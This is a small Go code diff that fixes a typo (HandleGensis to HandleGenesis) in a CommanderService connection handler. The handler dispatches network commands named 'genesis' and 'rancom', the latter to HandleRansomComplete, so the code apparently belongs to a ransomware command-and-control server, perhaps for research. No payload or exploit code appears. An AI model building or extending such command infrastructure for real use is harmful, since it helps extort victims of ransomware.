@@ -58,7 +58,7 @@ func (c *CommanderService) handleConnection(conn net.Conn) {
 
 	switch command {
 	case "genesis":
-		c.HandleGensis(req.Bytes()[commandLength:])
+		c.HandleGenesis(req.Bytes()[commandLength:])
 	case "rancom":
 		c.HandleRansomComplete(req.Bytes()[commandLength:])
 	}
